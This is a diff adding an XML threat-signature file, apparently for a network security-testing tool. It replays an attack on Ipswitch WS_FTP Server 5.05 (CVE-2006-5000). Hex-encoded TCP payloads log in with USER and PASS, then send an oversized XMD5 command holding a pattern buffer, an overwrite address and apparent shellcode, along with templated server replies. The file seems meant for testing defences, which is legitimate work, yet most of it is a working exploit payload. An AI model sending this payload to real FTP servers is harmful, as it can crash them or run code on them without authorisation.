@@ -1,0 +1,131 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Ipswitch WS_FTP Server XCRC XSHA1 and XMD5 Commands Buffer Overflow Vulnerabilities"/>
+    <EngDesc display="true" value="This threat uses a large malformed XMD5 string to cause a denial of service condition or execute code via stack overflow. Ipswitch WS_FTP server listens on port 21."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Denial_of_Service"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="FTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Ipswitch"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Ipswitch_WS_FTP_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Ipswitch_WS_FTP_Server_5.05"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3335"/>
+    <CVEID display="true" value="CVE-2006-5000"/>
+    <bugtraqID display="true" value="20076"/>
+    <OSVDB display="true" value="30974"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="1356c44b8e9863afeaade1e4a5d95991"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633076169641560839"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1172226411" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="FTPdestPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="M"/>
+    </for>
+    <for index="H">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="M"/>
+    </for>
+    <for index="J">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="M"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$FTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="5553455220757365720A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$FTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="504153532070617373776F72640A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="J" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$FTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="584D443520416130416131416132416133416134416135416136416137416138416139416230416231416232416233416234416235416236416237416238416239416330416331416332416333416334416335416336416337416338416339416430416431416432416433416434416435416436416437416438416439416530416531416532416533416534416535416536416537416538416539416630416631416632416633416634416635416636416637416638416639416730416731416732416733416734416735416736416737416738416739416830416831416832416833416834416835416836416837416838416839416930416931416932416933416934416935416936416937416938416939416A30416A31416A32416A33416A34416A35416A36416A37416A38416A39416B30416B31416B32416B33416B34416B35416B36416B37416B38416B39416C30416C31416C32416C33416C34416C35416C36416C37416C38416C39416D30416D31416D32416D33416D34416D35416D36416D37416D38416D39416E30416E31416E32416E33416E34416E35416E36416E37416E38416E39416F30416F31416F32416F33416F34416F35416F36416F37416F38416F394170304170314170324170334170344170354170364170374170384170394171304171314171324171334171344171354171364171374171384171394172304172314172324172334172344172354172364172374172384172394173304173314173324173334173344173354173364173374173384173394174304174314174324174334174344174354174364174374174384174394175304175314175324175334175344175354175364175374175384175394176304176314176324176334176344176354176364176374176384176394177304177314177324177334177344136E602109737994F3F499F37D63FF8FD4A499B4E42F84BFDFC9191964E97FD3F40904E9340939B46474F4A40419691F5F5494F43FC42499B993F4FD6489BF8274E999797D627D64F2747979F97379892279337FC979F9641FC97F598D6984B27494941FC983F41F59F4E96F54396F59B4840F5934E92FC9696F9F9989047922799484291439BF54B9FF59643414393984B424797969BFC479FF99B469241434B4B4E40D6963746984096FC6A2359D9EED97424F45B81731311301D7C83EBFCE2F4EDD8597C113096392DBB61796931F2F75E2896233131F6359A04967DFF01DDE5BDB4DD0816F1D77110F2F6882A64397864D596233531F61A9A3C56F74E2C1C979A2C967DFAB9415815F32CBC75BB5D4C94F065709A7011F7612CB0F77938F6759AB0AD7C113096142D6F2C8A7166948492F0662C79DFD39C715885829B3E4A83F6537C10721E780474301D7C0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="0,1,2">
+    <Output index="A" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3232302053706972656e744654504420536572766572202857656c636f6d6520746f20626c617374657229205b3a3a666666663a35392e33312e3133312e34345d0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3333312050617373776f72642072657175697265640d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3233302055736572206c6f6767656420696e2e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
